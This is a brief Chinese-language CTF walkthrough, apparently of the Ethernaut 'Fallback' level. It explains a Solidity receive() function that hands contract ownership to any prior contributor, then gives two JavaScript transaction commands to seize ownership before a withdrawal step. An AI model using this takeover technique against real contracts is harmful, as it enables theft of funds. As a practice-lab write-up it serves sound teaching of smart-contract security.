## 1. Fallback

合约中的方法

```sol
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

是一个fallback方法，向合约发送的请求找不到相应的方法时会调用该方法。

1. contribute使自己的contribution大于0
   ```js
   await contract.contribute.sendTransaction({"from": player, "value": toWei("0.0005")})
   ```
2. 发送交易，触发fallback方法：
   ```js
   await sendTransaction({"from": player, "to": contract.address, "value": 1})
   ```
3. 提款
